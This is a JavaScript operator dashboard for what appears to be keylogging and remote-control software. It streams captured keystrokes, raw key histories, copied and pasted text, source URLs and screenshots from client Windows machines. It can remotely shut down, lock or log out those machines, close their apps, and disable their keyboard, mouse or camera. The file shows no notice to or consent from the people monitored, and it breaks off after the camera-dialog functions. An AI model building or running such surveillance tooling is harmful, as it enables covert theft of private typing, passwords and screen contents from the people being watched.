import { fetchJson, postJson } from './parts/api.js';
import { formatAge, formatTime, formatUptime } from './parts/formatters.js';

const feed = document.getElementById('feed');
  const liveNotificationEl = document.getElementById('liveNotification');
  const liveNotificationTextEl = document.getElementById('liveNotificationText');
  const closeNotificationEl = document.getElementById('closeNotification');
    const statusEl = document.getElementById('status');
    const startedAtEl = document.getElementById('startedAt');
    const uptimeEl = document.getElementById('uptime');
    const messageCountEl = document.getElementById('messageCount');
    const deviceCountEl = document.getElementById('deviceCount');
    const onlineCountEl = document.getElementById('onlineCount');
    const deviceUpdatedEl = document.getElementById('deviceUpdated');
    const deviceListEl = document.getElementById('deviceList');
    const openAppsDeviceEl = document.getElementById('openAppsDevice');
    const openAppsListEl = document.getElementById('openAppsList');
    const closeAllAppsButtonEl = document.getElementById('closeAllAppsButton');
    const supportLinkEl = document.getElementById('supportLink');
    const paymentListEl = document.getElementById('paymentList');
    const scopeLabelEl = document.getElementById('scopeLabel');
    const messageSearchEl = document.getElementById('messageSearch');
    const rawHistoryControlsEl = document.getElementById('rawHistoryControls');
    const rawDeviceFilterEl = document.getElementById('rawDeviceFilter');
    const rawSessionFilterEl = document.getElementById('rawSessionFilter');
    const rawStartFilterEl = document.getElementById('rawStartFilter');
    const rawEndFilterEl = document.getElementById('rawEndFilter');
    const controlsPanelEl = document.getElementById('controlsPanel');
    const controlsDeviceEl = document.getElementById('controlsDevice');
    const captureScreenshotButtonEl = document.getElementById('captureScreenshotButton');
    const controlsScreenshotProgressEl = document.getElementById('controlsScreenshotProgress');
    const controlsScreenshotStatusEl = document.getElementById('controlsScreenshotStatus');
    const controlsScreenshotPreviewEl = document.getElementById('controlsScreenshotPreview');
    const controlsScreenshotPlaceholderEl = document.getElementById('controlsScreenshotPlaceholder');
    const activityPanelEl = document.getElementById('activityPanel');
    const controlsStatusEl = document.getElementById('controlsStatus');
    const commandHistoryEl = document.getElementById('commandHistory');
    const activityStatsEl = document.getElementById('activityStats');
    const topAppsEl = document.getElementById('topApps');
    const topDomainsEl = document.getElementById('topDomains');
    const deviceDetailEl = document.getElementById('deviceDetail');
    const exportCsvLinkEl = document.getElementById('exportCsvLink');
    const exportJsonLinkEl = document.getElementById('exportJsonLink');
    const shutdownButtonEl = document.getElementById('shutdownButton');
    const logoutClientButtonEl = document.getElementById('logoutClientButton');
    const restartClientButtonEl = document.getElementById('restartClientButton');
    const lockClientButtonEl = document.getElementById('lockClientButton');
    const pauseClientButtonEl = document.getElementById('pauseClientButton');
    const resumeClientButtonEl = document.getElementById('resumeClientButton');
    const disableMouseButtonEl = document.getElementById('disableMouseButton');
    const disableKeyboardButtonEl = document.getElementById('disableKeyboardButton');
    const disableCameraButtonEl = document.getElementById('disableCameraButton');
    const mouseDialogEl = document.getElementById('mouseDialog');
    const keyboardDialogEl = document.getElementById('keyboardDialog');
    const cameraDialogEl = document.getElementById('cameraDialog');
    const mouseFormEl = document.getElementById('mouseForm');
    const keyboardFormEl = document.getElementById('keyboardForm');
    const cameraFormEl = document.getElementById('cameraForm');
    const mouseDialogTargetEl = document.getElementById('mouseDialogTarget');
    const keyboardDialogTargetEl = document.getElementById('keyboardDialogTarget');
    const cameraDialogTargetEl = document.getElementById('cameraDialogTarget');
    const mouseDurationEl = document.getElementById('mouseDuration');
    const keyboardDurationEl = document.getElementById('keyboardDuration');
    const cameraDurationEl = document.getElementById('cameraDuration');
    const closeMouseButtonEl = document.getElementById('closeMouseButton');
    const closeKeyboardButtonEl = document.getElementById('closeKeyboardButton');
    const closeCameraButtonEl = document.getElementById('closeCameraButton');
    const cancelMouseButtonEl = document.getElementById('cancelMouseButton');
    const cancelKeyboardButtonEl = document.getElementById('cancelKeyboardButton');
    const cancelCameraButtonEl = document.getElementById('cancelCameraButton');
    const confirmMouseButtonEl = document.getElementById('confirmMouseButton');
    const confirmKeyboardButtonEl = document.getElementById('confirmKeyboardButton');
    const confirmCameraButtonEl = document.getElementById('confirmCameraButton');
    const refreshButtonEl = document.getElementById('refreshButton');
    const openMessageButtonEl = document.getElementById('openMessageButton');
    const todayHistoryButtonEl = document.getElementById('todayHistoryButton');
    const messageDialogEl = document.getElementById('messageDialog');
    const closeMessageButtonEl = document.getElementById('closeMessageButton');
    const cancelMessageButtonEl = document.getElementById('cancelMessageButton');
    const messageDialogTargetEl = document.getElementById('messageDialogTarget');
    const messageLengthEl = document.getElementById('messageLength');
    const messageComposeEl = document.getElementById('messageCompose');
    const clientMessageEl = document.getElementById('clientMessage');
    const sendMessageButtonEl = document.getElementById('sendMessageButton');
    const historyDialogEl = document.getElementById('historyDialog');
    const closeHistoryButtonEl = document.getElementById('closeHistoryButton');
    const closeHistoryDialogButtonEl = document.getElementById('closeHistoryDialogButton');
    const todayHistoryTargetEl = document.getElementById('todayHistoryTarget');
    const todayHistoryListEl = document.getElementById('todayHistoryList');
    const deviceUptimes = new Map();
    const deviceOnlineStates = new Map();
    const deviceClocks = new Map();
    let latestDevices = [];
    let selectedDeviceId = new URLSearchParams(window.location.search).get('device') || '';
    let displayMode = 'filtered';
    let currentMessages = [];
    let eventSource = null;
    let serviceStartedAt = null;
    let serviceUptime = 0;
    let renderQueued = false;
    let rawHistory = [];
    let lastDeviceSignature = '';
    let panelRequestId = 0;
    let screenshotSignature = null;
    let notificationTimer = null;

    function showLiveNotification(msg) {
      const preview = String(msg.text || msg.raw_text || '').trim();
      const source = msg.app_name ? ` in ${msg.app_name}` : '';
      liveNotificationTextEl.textContent = `${preview || 'New activity received'}${source}`;
      liveNotificationEl.hidden = false;
      if (notificationTimer) clearTimeout(notificationTimer);
      notificationTimer = setTimeout(() => {
        liveNotificationEl.hidden = true;
      }, 5000);
    }

    closeNotificationEl.addEventListener('click', () => {
      liveNotificationEl.hidden = true;
      if (notificationTimer) clearTimeout(notificationTimer);
    });

    function updateUptime() {
      if (serviceStartedAt === null) return;
      serviceUptime += 1;
      uptimeEl.textContent = formatUptime(serviceUptime);
    }

    function updateDeviceUptimes() {
      document.querySelectorAll('.device-uptime').forEach((uptimeEl) => {
        const deviceId = uptimeEl.dataset.deviceId;
        let seconds = deviceUptimes.get(deviceId);
        if (seconds === undefined) return;
        if (deviceOnlineStates.get(deviceId)) {
          seconds += 1;
          deviceUptimes.set(deviceId, seconds);
        }
        uptimeEl.textContent = `Uptime: ${formatUptime(seconds)}`;
      });
      document.querySelectorAll('.device-local-time').forEach((timeEl) => {
        const deviceId = timeEl.dataset.deviceId;
        const clock = deviceClocks.get(deviceId);
        if (!clock) return;
        const elapsed = Date.now() - clock.receivedAt;
        timeEl.textContent = `Device time ${new Date(clock.timeMs + elapsed).toLocaleString([], { dateStyle: 'medium', timeStyle: 'medium' })}`;
      });
    }

    function renderOpenApps(devices) {
      const device = devices.find((item) => String(item.id) === selectedDeviceId);
      openAppsListEl.innerHTML = '';
      if (!device) {
        openAppsDeviceEl.textContent = 'Select a device';
        const item = document.createElement('li');
        item.textContent = 'Select a device to view open apps';
        openAppsListEl.appendChild(item);
        closeAllAppsButtonEl.disabled = true;
        return;
      }
      openAppsDeviceEl.textContent = `${device.name || 'Unknown device'} Â· ${device.id}`;
      closeAllAppsButtonEl.disabled = !device.online;
      const apps = Array.isArray(device.open_apps) ? device.open_apps : [];
      if (!apps.length) {
        const item = document.createElement('li');
        item.textContent = device.online
          ? 'No app telemetry yet. Install the updated client.'
          : 'Device offline';
        openAppsListEl.appendChild(item);
        return;
      }
      apps.forEach((app) => {
        const item = document.createElement('li');
        item.className = 'open-app-item';

        const appLabel = document.createElement('span');
        appLabel.className = 'open-app-label';
        appLabel.textContent = app;

        const closeButton = document.createElement('button');
        closeButton.type = 'button';
        closeButton.className = 'control-button control-button-warning';
        closeButton.textContent = 'Close';
        closeButton.addEventListener('click', async () => {
          if (!selectedDeviceId) return;
          closeButton.disabled = true;
          closeButton.textContent = 'Closing...';
          try {
            await postJson(`/api/devices/${encodeURIComponent(selectedDeviceId)}/command`, {
              command: 'close_app',
              message: String(app),
            });
            controlsStatusEl.textContent = `Close request sent for ${app}.`;
          } catch (err) {
            controlsStatusEl.textContent = `Could not close ${app}.`;
          } finally {
            closeButton.disabled = false;
            closeButton.textContent = 'Close';
          }
        });

        item.append(appLabel, closeButton);
        openAppsListEl.appendChild(item);
      });
    }

    closeAllAppsButtonEl.addEventListener('click', async () => {
      if (!selectedDeviceId) {
        controlsStatusEl.textContent = 'Select a device first.';
        return;
      }
      closeAllAppsButtonEl.disabled = true;
      controlsStatusEl.textContent = 'Closing all visible windows...';
      try {
        await postJson(`/api/devices/${encodeURIComponent(selectedDeviceId)}/command`, {
          command: 'close_all_apps',
          message: '',
        });
        controlsStatusEl.textContent = 'Close-all request sent.';
      } catch (err) {
        controlsStatusEl.textContent = 'Close-all request failed.';
      } finally {
        closeAllAppsButtonEl.disabled = false;
      }
    });

    function renderPaymentMethods(paymentMethods) {
      paymentListEl.innerHTML = '';
      paymentMethods
        .filter((method) => method.value)
        .forEach((method) => {
          const item = document.createElement('div');
          item.className = 'payment-item';

          const details = document.createElement('div');
          details.className = 'payment-details';
          const name = document.createElement('span');
          name.className = 'payment-name';
          name.textContent = method.name;
          const value = document.createElement('span');
          value.className = 'payment-value';
          value.textContent = method.value;
          details.append(name, value);

          const copyButton = document.createElement('button');
          copyButton.className = 'copy-payment';
          copyButton.type = 'button';
          copyButton.textContent = 'Copy';
          copyButton.addEventListener('click', async () => {
            try {
              await navigator.clipboard.writeText(method.value);
              copyButton.textContent = 'Copied';
              setTimeout(() => { copyButton.textContent = 'Copy'; }, 1400);
            } catch (err) {
              copyButton.textContent = 'Select';
            }
          });

          item.append(details, copyButton);
          paymentListEl.appendChild(item);
        });
    }

    async function loadConfig() {
      try {
        const config = await fetchJson('/api/config');
        if (config.buy_me_a_coffee_url) supportLinkEl.href = config.buy_me_a_coffee_url;
        renderPaymentMethods(config.payment_methods || []);
        if (!config.buy_me_a_coffee_url && config.payment_methods?.length) {
          supportLinkEl.textContent = 'Support options';
          supportLinkEl.removeAttribute('href');
        }
      } catch (err) {
        // Keep the editable placeholder link when optional config is unavailable.
      }
    }

    function updateScreenshotProgress(status) {
      const stages = ['Queued', 'Capturing', 'Uploading', 'Ready'];
      const normalized = String(status || '').trim();
      const stageOrder = {
        Requested: 0,
        Queued: 0,
        Capturing: 1,
        'Taking screenshot': 1,
        Uploading: 2,
        Failed: -1,
        Ready: 3,
      };
      const activeIndex = stageOrder[normalized] ?? (normalized.includes('capture') ? 1 : normalized.includes('upload') ? 2 : 0);
      controlsScreenshotProgressEl.querySelectorAll('.progress-step').forEach((step, index) => {
        const stageName = step.dataset.stage;
        const isActive = index === activeIndex;
        const isComplete = stageOrder[stageName] !== undefined && (stageOrder[stageName] < activeIndex || (normalized === 'Ready' && stageName === 'Ready'));
        step.classList.toggle('active', isActive);
        step.classList.toggle('done', isComplete);
      });
      if (normalized === 'Failed') {
        controlsScreenshotProgressEl.querySelectorAll('.progress-step').forEach((step) => {
          step.classList.remove('active', 'done');
        });
      }
    }

    function updateSelectedDeviceScreenshot() {
      const selectedDevice = latestDevices.find((device) => String(device.id) === String(selectedDeviceId));
      const defaultStatus = 'Ready to capture';
      if (!selectedDeviceId || !selectedDevice) {
        controlsScreenshotStatusEl.textContent = 'Select a device to preview screenshots.';
        controlsScreenshotStatusEl.className = 'controls-screenshot-status';
        controlsScreenshotProgressEl.querySelectorAll('.progress-step').forEach((step) => {
          step.classList.remove('active', 'done');
        });
        controlsScreenshotPreviewEl.hidden = true;
        controlsScreenshotPreviewEl.removeAttribute('src');
        controlsScreenshotPlaceholderEl.hidden = false;
        captureScreenshotButtonEl.disabled = true;
        return;
      }
      const status = selectedDevice.screenshot_status || 'Ready';
      const message = selectedDevice.screenshot_message || defaultStatus;
      const isBusy = ['Requested', 'Taking screenshot'].includes(status);
      controlsScreenshotStatusEl.textContent = message;
      controlsScreenshotStatusEl.className = `controls-screenshot-status ${(status || '').toLowerCase().replaceAll(' ', '-')}`;
      updateScreenshotProgress(status);
      captureScreenshotButtonEl.disabled = !selectedDevice.online || isBusy;
      if (selectedDevice.screenshot_url) {
        controlsScreenshotPreviewEl.src = `${selectedDevice.screenshot_url}?t=${Date.now()}`;
        controlsScreenshotPreviewEl.hidden = false;
        controlsScreenshotPlaceholderEl.hidden = true;
      } else {
        controlsScreenshotPreviewEl.hidden = true;
        controlsScreenshotPreviewEl.removeAttribute('src');
        controlsScreenshotPlaceholderEl.hidden = false;
      }
    }

    async function loadDevices() {
      try {
        const devices = await fetchJson('/api/devices');
        latestDevices = devices;
        renderOpenApps(devices);
        deviceCountEl.textContent = devices.length;
        onlineCountEl.textContent = `${devices.filter((device) => device.online).length} online`;
        deviceUpdatedEl.textContent = `Updated ${new Date().toLocaleTimeString([], { hour: 'numeric', minute: '2-digit' })}`;
        updateSelectedDeviceScreenshot();
        devices.forEach((device) => {
          const deviceId = String(device.id || 'unknown');
          deviceUptimes.set(deviceId, Number(device.uptime_seconds) || 0);
          deviceOnlineStates.set(deviceId, Boolean(device.online));
          if (Number.isFinite(Number(device.local_time_ms)) && Number(device.local_time_ms) >= 100000000000) {
            const nextTime = Number(device.local_time_ms);
            const currentClock = deviceClocks.get(deviceId);
            if (!currentClock || Math.abs(currentClock.timeMs - nextTime) > 2000) {
              deviceClocks.set(deviceId, { timeMs: nextTime, receivedAt: Date.now() });
            }
          }
        });
        const deviceSignature = JSON.stringify(devices.map((device) => ({
          id: device.id,
          name: device.name,
          client_version: device.client_version,
          online: device.online,
          status: device.status,
          open_apps: device.open_apps,
          local_time_ms: device.local_time_ms,
          logged_in_user: device.logged_in_user,
          battery_percent: device.battery_percent,
          battery_status: device.battery_status,
          screenshot_status: device.screenshot_status,
          screenshot_message: device.screenshot_message,
        })));
        if (deviceSignature === lastDeviceSignature) return;
        lastDeviceSignature = deviceSignature;
        deviceListEl.innerHTML = '';
        if (!devices.length) {
          deviceListEl.innerHTML = '<span class="device-seen">No devices registered</span>';
          return;
        }
        devices.forEach((device) => {
          const deviceId = String(device.id || 'unknown');
          const row = document.createElement('div');
          row.className = `device-row${device.online ? ' online' : ''}${deviceId === selectedDeviceId ? ' selected' : ''}`;
          row.addEventListener('click', () => selectDevice(deviceId));

          const name = document.createElement('span');
          name.className = 'device-name';
          name.textContent = device.name || 'Unknown device';

          const id = document.createElement('span');
          id.className = 'device-id';
          id.textContent = `ID: ${device.id || 'unknown'}`;

          const version = document.createElement('span');
          version.className = 'device-version';
          version.textContent = `Client v${device.client_version || 'unknown'}`;

          const state = document.createElement('span');
          state.className = `device-state ${device.online ? 'online' : 'offline'}`;
          state.textContent = device.status || (device.online ? 'Online' : 'Offline');

          const uptime = document.createElement('span');
          uptime.className = 'device-seen device-uptime';
          uptime.dataset.deviceId = deviceId;
          uptime.textContent = `Uptime: ${formatUptime(deviceUptimes.get(deviceId))}`;

          const seen = document.createElement('span');
          seen.className = 'device-seen';
          seen.textContent = device.last_seen
            ? `Last seen ${formatAge(device.last_seen_age_seconds || 0)}`
            : 'Last seen unknown';

          const joined = document.createElement('span');
          joined.className = 'device-seen';
          joined.textContent = device.joined_at
            ? `Joined ${formatTime(device.joined_at)}`
            : 'Joined date unknown';

          const localTime = document.createElement('span');
          localTime.className = 'device-seen device-local-time';
          localTime.dataset.deviceId = deviceId;
          const validDeviceTime = Number(device.local_time_ms) >= 100000000000;
          localTime.textContent = validDeviceTime
            ? `Device time ${new Date(Number(device.local_time_ms)).toLocaleString([], { dateStyle: 'medium', timeStyle: 'medium' })}`
            : device.local_time
              ? `Device time ${device.local_time}`
              : 'Device time unavailable';

          const user = document.createElement('span');
          user.className = 'device-seen';
          user.textContent = `Logged in as ${device.logged_in_user || 'Unknown user'}`;

          const battery = document.createElement('span');
          battery.className = 'device-seen';
          const batteryPercent = device.battery_percent == null ? '' : ` ${device.battery_percent}%`;
          battery.textContent = `Battery: ${device.battery_status || 'Unknown'}${batteryPercent}`;

          row.append(name, id, version, state, uptime, seen, joined, localTime, user, battery);
          deviceListEl.appendChild(row);
        });
      } catch (err) {
        if (!lastDeviceSignature) deviceListEl.innerHTML = '<span class="device-seen">Unavailable</span>';
      }
    }

    async function loadHealth() {
      try {
        const health = await fetchJson('/health');
        serviceStartedAt = health.started_at;
        serviceUptime = health.uptime_seconds;
        startedAtEl.textContent = formatTime(serviceStartedAt);
        messageCountEl.textContent = health.count;
        updateUptime();
      } catch (err) {
        startedAtEl.textContent = 'Unavailable';
        uptimeEl.textContent = 'Unavailable';
      }
    }

    function addMessage(msg) {
      if (displayMode === 'filtered' && msg.raw_only) return;
      const wrap = document.createElement('div');
      wrap.className = 'bubble-wrap';

      const bubble = document.createElement('div');
      const bubbleType = msg.is_pasted ? 'pasted' : (msg.is_copied ? 'copied' : '');
      bubble.className = `bubble${bubbleType ? ` ${bubbleType}` : ''}`;
      bubble.textContent = displayMode === 'raw' ? (msg.raw_text || msg.text) : msg.text;

      if (msg.is_pasted || msg.is_copied) {
        const label = document.createElement('span');
        label.className = 'paste-label';
        label.textContent = msg.is_copied ? 'Copied' : 'Pasted';
        bubble.prepend(label);
      }

      const time = document.createElement('span');
      time.className = 'time';
      time.textContent = formatTime(msg.time);
      bubble.appendChild(time);

      const device = document.createElement('span');
      device.className = 'device';
      device.textContent = `From device ${msg.device_id || 'unknown'}${msg.device_name ? ` (${msg.device_name})` : ''}`;
      bubble.appendChild(device);

      const source = document.createElement('span');
      source.className = 'source';
      source.textContent = `Entered in: ${msg.app_name || 'Unknown app'}`;
      bubble.appendChild(source);

      if (msg.source_url) {
        const sourceLinkRow = document.createElement('div');
        sourceLinkRow.className = 'source-link-row';
        const sourceLink = document.createElement('a');
        sourceLink.className = 'source-link';
        sourceLink.href = msg.source_url;
        sourceLink.target = '_blank';
        sourceLink.rel = 'noopener noreferrer';
        sourceLink.title = msg.source_url;
        sourceLink.textContent = msg.source_url;

        const copySourceButton = document.createElement('button');
        copySourceButton.className = 'copy-source';
        copySourceButton.type = 'button';
        copySourceButton.textContent = 'Copy link';
        copySourceButton.addEventListener('click', async () => {
          try {
            await navigator.clipboard.writeText(msg.source_url);
            copySourceButton.textContent = 'Copied';
            setTimeout(() => { copySourceButton.textContent = 'Copy link'; }, 1400);
          } catch (err) {
            copySourceButton.textContent = 'Select';
          }
        });

        sourceLinkRow.append(sourceLink, copySourceButton);
        bubble.appendChild(sourceLinkRow);
      }

      wrap.appendChild(bubble);
      return wrap;
    }

    function visibleMessages() {
      const search = messageSearchEl.value.trim().toLowerCase();
      const matchesSearch = (msg) => {
        if (!search) return true;
        return [msg.text, msg.raw_text, msg.device_name, msg.device_id, msg.app_name]
          .some((value) => String(value || '').toLowerCase().includes(search));
      };
      if (displayMode === 'raw') {
        const rawMessages = currentMessages.filter((msg) => msg.raw_only && matchesSearch(msg));
        return rawMessages.length ? rawMessages : currentMessages.filter(matchesSearch);
      }
      return currentMessages.filter((msg) => !msg.raw_only && matchesSearch(msg));
    }

    function updateMessageCount() {
      messageCountEl.textContent = visibleMessages().length;
    }

    function queueFeedRender() {
      if (renderQueued) return;
      renderQueued = true;
      requestAnimationFrame(() => {
        renderQueued = false;
        renderFeed();
      });
    }

    function renderFeed() {
      feed.innerHTML = '';
      if (displayMode === 'raw-history') {
        const fragment = document.createDocumentFragment();
        rawHistory.forEach((batch) => {
          const section = document.createElement('section');
          section.className = 'raw-batch';
          const heading = document.createElement('header');
          heading.className = 'raw-batch-heading';
          heading.textContent = `${formatTime(batch.started_at)} - ${formatTime(batch.ended_at)} | ${batch.device_name} | ${batch.event_count} events`;
          const session = document.createElement('span');
          session.textContent = `Session ${batch.session_id}`;
          heading.appendChild(session);
          section.appendChild(heading);
          batch.events.forEach((event) => {
            const row = document.createElement('div');
            row.className = 'raw-event';
            const time = document.createElement('time');
            time.textContent = formatTime(event.time);
            const key = document.createElement('code');
            key.textContent = event.key;
            const app = document.createElement('span');
            app.textContent = event.app_name || 'Unknown app';
            row.append(time, key, app);
            section.appendChild(row);
          });
          fragment.appendChild(section);
        });
        feed.appendChild(fragment);
        messageCountEl.textContent = rawHistory.reduce((count, batch) => count + batch.event_count, 0);
        feed.scrollTop = 0;
        return;
      }
      if (displayMode === 'raw') {
        const rawLog = document.createElement('pre');
        rawLog.className = 'raw-log';
        rawLog.textContent = visibleMessages()
          .map((msg) => msg.raw_text || msg.text)
          .join('');
        feed.appendChild(rawLog);
        updateMessageCount();
        feed.scrollTop = feed.scrollHeight;
        return;
      }
      const fragment = document.createDocumentFragment();
      visibleMessages().forEach((msg) => fragment.appendChild(addMessage(msg)));
      feed.appendChild(fragment);
      updateMessageCount();
      feed.scrollTop = feed.scrollHeight;
    }

    async function loadInitialMessages() {
      try {
        const query = selectedDeviceId ? `?device_id=${encodeURIComponent(selectedDeviceId)}` : '';
        const messages = await fetchJson(`/messages${query}`);
        currentMessages = messages;
        renderFeed();
        statusEl.textContent = selectedDeviceId ? 'Device filtered keys: ' + visibleMessages().length : 'Latest filtered keys: ' + visibleMessages().length;
        return true;
      } catch (err) {
        statusEl.textContent = 'Listening for filtered keysâ€¦';
        return false;
      }
    }

    async function loadRawHistory() {
      const requestId = ++panelRequestId;
      showFeedLoader('Loading raw history');
      const params = new URLSearchParams();
      const deviceId = rawDeviceFilterEl.value.trim() || selectedDeviceId;
      if (deviceId) params.set('device_id', deviceId);
      if (rawSessionFilterEl.value.trim()) params.set('session_id', rawSessionFilterEl.value.trim());
      if (rawStartFilterEl.value) params.set('start_time', String(new Date(rawStartFilterEl.value).getTime()));
      if (rawEndFilterEl.value) params.set('end_time', String(new Date(rawEndFilterEl.value).getTime()));
      params.set('limit', '100');
      try {
        rawHistory = await fetchJson(`/api/raw-history?${params}`);
        if (requestId !== panelRequestId) return;
        renderFeed();
        statusEl.textContent = `Raw history: ${rawHistory.length} batches`;
      } catch (err) {
        rawHistory = [];
        renderFeed();
        statusEl.textContent = 'Raw history unavailable';
      }
    }

    async function loadScreenshots() {
      const requestId = ++panelRequestId;
      try {
        const query = selectedDeviceId ? `?device_id=${encodeURIComponent(selectedDeviceId)}` : '';
        const screenshots = await fetchJson(`/api/screenshots${query}`);
        if (requestId !== panelRequestId) return;
        const nextSignature = screenshots.map((item) => item.id).join(',');
        if (nextSignature === screenshotSignature) return;
        screenshotSignature = nextSignature;
        feed.innerHTML = '';
        if (!screenshots.length) {
          feed.innerHTML = '<span class="device-seen">No screenshots saved</span>';
        } else {
          const grid = document.createElement('div');
          grid.className = 'screenshot-grid';
          screenshots.forEach((item) => {
            const card = document.createElement('article');
            card.className = 'screenshot-card';
            const image = document.createElement('img');
            image.src = item.image_url;
            image.alt = `Screenshot from ${item.device_name}`;
            image.loading = 'lazy';
            image.addEventListener('load', () => image.classList.add('loaded'));
            image.addEventListener('error', () => {
              image.classList.add('loaded');
              image.alt = 'Screenshot unavailable - check Render logs and storage configuration';
            });
            image.addEventListener('click', () => window.open(item.image_url, '_blank', 'noopener'));
            const device = document.createElement('strong');
            device.textContent = `${item.device_name} (${item.device_id})`;
            const time = document.createElement('span');
            time.textContent = formatTime(item.captured_at);
            card.append(image, device, time);
            grid.appendChild(card);
          });
          feed.appendChild(grid);
        }
        messageCountEl.textContent = screenshots.length;
        statusEl.textContent = `Screenshots: ${screenshots.length}`;
      } catch (err) {
        feed.innerHTML = '<span class="device-seen">Screenshots unavailable</span>';
        statusEl.textContent = 'Screenshots unavailable';
      }
    }

    function showFeedLoader(label) {
      feed.innerHTML = '';
      const loader = document.createElement('div');
      loader.className = 'feed-loader';
      loader.textContent = label;
      feed.appendChild(loader);
    }

    function connectEvents() {
      const params = new URLSearchParams();
      if (selectedDeviceId) params.set('device_id', selectedDeviceId);
      const lastMessageId = currentMessages.reduce((latest, msg) => Math.max(latest, Number(msg.id) || 0), 0);
      if (lastMessageId) params.set('since', String(lastMessageId));
      const query = params.toString() ? `?${params.toString()}` : '';
      eventSource = new EventSource(`/events${query}`);
      eventSource.onmessage = (event) => {
        const message = JSON.parse(event.data);
        currentMessages.push(message);
        if (currentMessages.length > 200) currentMessages.shift();
        showLiveNotification(message);
        queueFeedRender();
        statusEl.textContent = 'Live stream connected';
      };
      eventSource.onerror = () => {
        statusEl.textContent = 'Reconnect in progressâ€¦';
      };
    }

    async function selectDevice(deviceId) {
      if (selectedDeviceId === deviceId) return;
      selectedDeviceId = deviceId;
      const query = selectedDeviceId ? `/?device=${encodeURIComponent(selectedDeviceId)}` : '/';
      window.history.pushState({}, '', query);
      panelRequestId += 1;
      currentMessages = [];
      screenshotSignature = null;
      scopeLabelEl.textContent = `Device ${selectedDeviceId}`;
      controlsDeviceEl.textContent = `Selected device: ${selectedDeviceId}`;
      updateSelectedDeviceScreenshot();
      if (eventSource) eventSource.close();
      await loadInitialMessages();
      connectEvents();
      await loadDevices();
      if (displayMode === 'screenshots') await loadScreenshots();
      if (displayMode === 'activity') await loadActivity();
      if (displayMode === 'controls') await loadCommandHistory();
    }

    document.querySelectorAll('[data-mode]').forEach((button) => {
      button.addEventListener('click', async () => {
        panelRequestId += 1;
        displayMode = button.dataset.mode;
        button.setAttribute('aria-busy', 'true');
        document.querySelectorAll('[data-mode]').forEach((item) => item.classList.toggle('active', item === button));
        rawHistoryControlsEl.hidden = displayMode !== 'raw-history';
        controlsPanelEl.hidden = displayMode !== 'controls';
        activityPanelEl.hidden = displayMode !== 'activity';
        if (displayMode === 'raw-history') {
          if (eventSource) eventSource.close();
          await loadRawHistory();
        } else if (displayMode === 'screenshots') {
          if (eventSource) eventSource.close();
          await loadScreenshots();
        } else if (displayMode === 'controls') {
          if (eventSource) eventSource.close();
          feed.innerHTML = '';
          statusEl.textContent = 'Device controls';
          await loadCommandHistory();
        } else if (displayMode === 'activity') {
          if (eventSource) eventSource.close();
          feed.innerHTML = '';
          await loadActivity();
        } else {
          if (!eventSource || eventSource.readyState === EventSource.CLOSED) connectEvents();
          renderFeed();
        }
        button.removeAttribute('aria-busy');
      });
    });

    rawHistoryControlsEl.addEventListener('submit', (event) => {
      event.preventDefault();
      loadRawHistory();
    });

    async function requestClientCommand(command, button, confirmation) {
      if (!selectedDeviceId) {
        controlsStatusEl.textContent = 'Select a device first.';
        return;
      }
      if (!window.confirm(confirmation)) return;
      button.disabled = true;
      controlsStatusEl.textContent = `Requesting client ${command}...`;
      try {
        await postJson(`/api/devices/${encodeURIComponent(selectedDeviceId)}/command`, { command });
        controlsStatusEl.textContent = `Client ${command} requested.`;
      } catch (err) {
        button.disabled = false;
        controlsStatusEl.textContent = `Client ${command} failed.`;
      }
    }

    shutdownButtonEl.addEventListener('click', () => requestClientCommand(
      'shutdown', shutdownButtonEl, 'Shut down the selected client computer?'
    ));
    logoutClientButtonEl.addEventListener('click', () => requestClientCommand(
      'logout', logoutClientButtonEl, 'Log out the selected Windows user?'
    ));
    restartClientButtonEl.addEventListener('click', () => requestClientCommand(
      'restart', restartClientButtonEl, 'Restart the selected client computer?'
    ));
    lockClientButtonEl.addEventListener('click', () => requestClientCommand(
      'lock', lockClientButtonEl, 'Lock the selected client computer?'
    ));
    pauseClientButtonEl.addEventListener('click', () => requestClientCommand(
      'pause', pauseClientButtonEl, 'Pause collection on the selected client?'
    ));
    resumeClientButtonEl.addEventListener('click', () => requestClientCommand(
      'resume', resumeClientButtonEl, 'Resume collection on the selected client?'
    ));

    function openMouseDialog() {
      if (!selectedDeviceId) {
        controlsStatusEl.textContent = 'Select a device first.';
        return;
      }
      mouseDialogTargetEl.textContent = `Applying to ${controlsDeviceEl.textContent}`;
      mouseDialogEl.showModal();
      mouseDurationEl.focus();
      mouseDurationEl.select();
    }

    function closeMouseDialog() {
      if (mouseDialogEl.open) mouseDialogEl.close();
    }

    disableMouseButtonEl.addEventListener('click', openMouseDialog);
    closeMouseButtonEl.addEventListener('click', closeMouseDialog);
    cancelMouseButtonEl.addEventListener('click', closeMouseDialog);

    function openKeyboardDialog() {
      if (!selectedDeviceId) {
        controlsStatusEl.textContent = 'Select a device first.';
        return;
      }
      keyboardDialogTargetEl.textContent = `Applying to ${controlsDeviceEl.textContent}`;
      keyboardDialogEl.showModal();
      keyboardDurationEl.focus();
      keyboardDurationEl.select();
    }

    function closeKeyboardDialog() {
      if (keyboardDialogEl.open) keyboardDialogEl.close();
    }

    disableKeyboardButtonEl.addEventListener('click', openKeyboardDialog);
    closeKeyboardButtonEl.addEventListener('click', closeKeyboardDialog);
    cancelKeyboardButtonEl.addEventListener('click', closeKeyboardDialog);

    keyboardFormEl.addEventListener('submit', async (event) => {
      event.preventDefault();
      const seconds = Number.parseInt(keyboardDurationEl.value, 10);
      if (!selectedDeviceId) {
        closeKeyboardDialog();
        controlsStatusEl.textContent = 'Select a device first.';
        return;
      }
      if (!Number.isInteger(seconds) || seconds < 1 || seconds > 3600) {
        controlsStatusEl.textContent = 'Enter a duration from 1 to 3600 seconds.';
        keyboardDurationEl.focus();
        return;
      }
      confirmKeyboardButtonEl.disabled = true;
      controlsStatusEl.textContent = `Disabling keyboard for ${seconds} seconds...`;
      try {
        await postJson(`/api/devices/${encodeURIComponent(selectedDeviceId)}/command`, {
          command: 'disable_keyboard',
          message: String(seconds),
        });
        closeKeyboardDialog();
        controlsStatusEl.textContent = `Keyboard disabled for ${seconds} seconds.`;
      } catch (err) {
        controlsStatusEl.textContent = 'Keyboard could not be disabled.';
      } finally {
        confirmKeyboardButtonEl.disabled = false;
      }
    });

    function openCameraDialog() {
      if (!selectedDeviceId) {
        controlsStatusEl.textContent = 'Select a device first.';
        return;
      }
      cameraDialogTargetEl.textContent = `Applying to ${controlsDeviceEl.textContent}`;
      cameraDialogEl.showModal();
      cameraDurationEl.focus();
      cameraDurationEl.select();
    }

    function closeCameraDialog() {
      if (cameraDialogEl.open) cameraDialogEl.close();
    }

